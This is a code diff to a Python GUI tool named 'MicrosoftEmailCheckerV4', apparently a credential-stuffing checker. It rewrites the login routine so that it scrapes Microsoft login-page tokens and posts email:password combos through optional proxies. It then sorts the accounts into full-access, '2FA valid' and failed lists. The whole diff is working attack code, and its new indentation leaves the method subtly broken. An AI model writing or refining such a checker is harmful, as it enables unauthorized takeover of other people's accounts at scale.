@@ -482,123 +482,177 @@ class MicrosoftEmailCheckerV4:
                 self.speed_label.config(text=f"{speed:.0f}/min")
     
     def oauth_authenticate(self, email, password):
-        """OAuth web authentication - the working method"""
-        session = requests.Session()
-        session.headers.update({
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-        })
-        
-        # Apply proxy if enabled
-        if self.use_proxies.get():
-            proxy = self.get_proxy()
-            if proxy:
-                session.proxies = proxy
-        
-        tries = 0
-        while tries < self.max_retries.get():
-            try:
-                # Step 1: GET OAuth page to extract tokens
-                response = session.get(self.OAUTH_URL, timeout=15)
-                
-                # Extract sFTTag (PPFT token)
-                sftag_match = re.search(r'sFTTag:\s*\'.*value="(.+?)"', response.text)
-                if not sftag_match:
-                    self.log(f"Failed to extract token for {email}", "error")
-                    return "ERROR"
-                
-                sftag = sftag_match.group(1)
-                
-                # Extract urlPost
-                urlpost_match = re.search(r"urlPost:\s*'(.+?)'", response.text)
-                if not urlpost_match:
-                    return "ERROR"
-                
-                url_post = urlpost_match.group(1)
-                
-                # Step 2: POST credentials
-                data = {
-                    'login': email,
-                    'loginfmt': email,
-                    'passwd': password,
-                    'PPFT': sftag
-                }
-                
-                login_response = session.post(url_post, data=data, timeout=15, allow_redirects=True)
-                
-                # Step 3: Check response
-                response_text = login_response.text.lower()
-                response_url = login_response.url
-                
-                # SUCCESS - Has access token in URL
-                if '#' in response_url and 'access_token=' in response_url:
-                    token = parse_qs(urlparse(response_url).fragment).get('access_token', ['None'])[0]
-                    if token != 'None':
-                        # Check for Reddit emails (optional enhancement)
-                        # For now, mark as success
-                        with self.lock:
-                            self.success_count += 1
-                            self.full_access.append(f"{email}:{password}")
-                        
-                        self.access_text.insert(tk.END, f"{email}:{password}\n")
-                        self.access_text.see(tk.END)
-                        self.log(f"✅ SUCCESS: {email}", "success")
-                        return "SUCCESS"
-                
-                # 2FA DETECTED - Password correct but needs 2FA
-                if 'cancel?mkt=' in response_text or 'proofs' in response_text or 'identity/confirm' in response_text:
-                    with self.lock:
-                        self.twofa_count += 1
-                        self.twofa_valid.append(f"{email}:{password}")
-                    
-                    self.twofa_text.insert(tk.END, f"{email}:{password}\n")
-                    self.twofa_text.see(tk.END)
-                    self.log(f"🔐 2FA VALID: {email} (password correct!)", "twofa")
-                    return "2FA"
-                
-                # INVALID PASSWORD
-                if any(err in response_text for err in [
-                    'password is incorrect',
-                    'account doesn\'t exist',
-                    'sign in to your microsoft account',
-                    'your account or password is incorrect'
-                ]):
-                    with self.lock:
-                        self.failed_count += 1
-                        self.failed.append(email)
-                    
-                    self.log(f"❌ Failed: {email}", "error")
-                    return "INVALID"
-                
-                # Unknown response, retry
-                tries += 1
-                with self.lock:
-                    self.retry_count += 1
-                
-                if tries < self.max_retries.get():
-                    time.sleep(2)  # Wait before retry
-                    
-            except requests.exceptions.RequestException as e:
-                tries += 1
-                with self.lock:
-                    self.retry_count += 1
-                
-                if tries >= self.max_retries.get():
-                    with self.lock:
-                        self.failed_count += 1
-                    self.log(f"Network error: {email}", "error")
-                    return "ERROR"
-                
-                time.sleep(2)
+    """OAuth web authentication - FIXED token extraction"""
+    session = requests.Session()
+    session.headers.update({
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+    })
+    
+    # Apply proxy if enabled
+    if self.use_proxies.get():
+        proxy = self.get_proxy()
+        if proxy:
+            session.proxies = proxy
+    
+    tries = 0
+    while tries < self.max_retries.get():
+        try:
+            # Step 1: GET OAuth page to extract tokens
+            response = session.get(self.OAUTH_URL, timeout=15)
             
-            except Exception as e:
+            # Extract sFTTag (PPFT token) - MULTIPLE PATTERNS
+            sftag = None
+            
+            # Pattern 1: Input field with PPFT
+            sftag_match = re.search(r'<input.*?name="PPFT".*?value="([^"]+)"', response.text, re.DOTALL)
+            if sftag_match:
+                sftag = sftag_match.group(1)
+            else:
+                # Pattern 2: JavaScript variable
+                sftag_match = re.search(r"sFTTag.*?['\"]value['\"]:['\"]([^'\"]+)['\"]", response.text, re.DOTALL)
+                if sftag_match:
+                    sftag = sftag_match.group(1)
+                else:
+                    # Pattern 3: Direct value attribute
+                    sftag_match = re.search(r'value="([^"]+)".*?name="PPFT"', response.text, re.DOTALL)
+                    if sftag_match:
+                        sftag = sftag_match.group(1)
+            
+            if not sftag:
+                self.log(f"Failed to extract PPFT token for {email}", "error")
+                return "ERROR"
+            
+            # Extract urlPost - MULTIPLE PATTERNS
+            url_post = None
+            
+            # Pattern 1: JavaScript urlPost variable
+            urlpost_match = re.search(r'urlPost:\s*["\']([^"\']+)["\']', response.text)
+            if urlpost_match:
+                url_post = urlpost_match.group(1)
+            else:
+                # Pattern 2: Form action
+                urlpost_match = re.search(r'<form.*?action="([^"]+)".*?>', response.text, re.DOTALL)
+                if urlpost_match:
+                    url_post = urlpost_match.group(1)
+                else:
+                    # Pattern 3: Default Microsoft login POST URL
+                    url_post = "https://login.live.com/ppsecure/post.srf"
+            
+            # Ensure URL is complete
+            if not url_post.startswith('http'):
+                url_post = 'https://login.live.com' + url_post
+            
+            # Step 2: POST credentials
+            data = {
+                'login': email,
+                'loginfmt': email,
+                'passwd': password,
+                'PPFT': sftag,
+                'type': '11',
+                'LoginOptions': '3',
+                'ps': '2',
+                'canary': '',
+                'ctx': '',
+                'NewUser': '1',
+                'fspost': '0',
+                'i21': '0',
+                'CookieDisclosure': '0',
+                'IsFidoSupported': '1'
+            }
+            
+            login_response = session.post(url_post, data=data, timeout=15, allow_redirects=True)
+            
+            # Step 3: Check response
+            response_text = login_response.text.lower()
+            response_url = login_response.url
+            
+            # SUCCESS - Has access token in URL
+            if '#' in response_url and 'access_token=' in response_url:
+                token = parse_qs(urlparse(response_url).fragment).get('access_token', ['None'])[0]
+                if token != 'None':
+                    with self.lock:
+                        self.success_count += 1
+                        self.full_access.append(f"{email}:{password}")
+                    
+                    self.access_text.insert(tk.END, f"{email}:{password}\n")
+                    self.access_text.see(tk.END)
+                    self.log(f"✅ SUCCESS: {email}", "success")
+                    return "SUCCESS"
+            
+            # 2FA DETECTED - Enhanced detection
+            twofa_indicators = [
+                'cancel?mkt=',
+                'proofs',
+                'identity/confirm',
+                'otc',
+                'beginauth',
+                'showotc',
+                'twostepauthentication',
+                'verifyidentity',
+                'authenticatorapp',
+                'twowayauthentication',
+                'securitycode'
+            ]
+            
+            if any(indicator in response_text for indicator in twofa_indicators):
+                with self.lock:
+                    self.twofa_count += 1
+                    self.twofa_valid.append(f"{email}:{password}")
+                
+                self.twofa_text.insert(tk.END, f"{email}:{password}\n")
+                self.twofa_text.see(tk.END)
+                self.log(f"🔐 2FA VALID: {email} (password correct!)", "twofa")
+                return "2FA"
+            
+            # INVALID PASSWORD - Enhanced detection
+            invalid_indicators = [
+                'password is incorrect',
+                'account doesn\'t exist',
+                'sign in to your microsoft account',
+                'your account or password is incorrect',
+                'that password didn\'t work',
+                'incorrect account or password',
+                'enter a valid email'
+            ]
+            
+            if any(err in response_text for err in invalid_indicators):
                 with self.lock:
                     self.failed_count += 1
+                    self.failed.append(email)
+                
+                self.log(f"❌ Failed: {email}", "error")
+                return "INVALID"
+            
+            # Unknown response, retry
+            tries += 1
+            with self.lock:
+                self.retry_count += 1
+            
+            if tries < self.max_retries.get():
+                time.sleep(2)
+                
+        except requests.exceptions.RequestException as e:
+            tries += 1
+            with self.lock:
+                self.retry_count += 1
+            
+            if tries >= self.max_retries.get():
+                with self.lock:
+                    self.failed_count += 1
+                self.log(f"Network error: {email}", "error")
                 return "ERROR"
+            
+            time.sleep(2)
         
-        # Max retries reached
-        with self.lock:
-            self.failed_count += 1
-        return "FAILED"
+        except Exception as e:
+            with self.lock:
+                self.failed_count += 1
+            return "ERROR"
+    
+    # Max retries reached
+    with self.lock:
+        self.failed_count += 1
+    return "FAILED"
     
     def worker(self, combo):
         """Worker thread"""
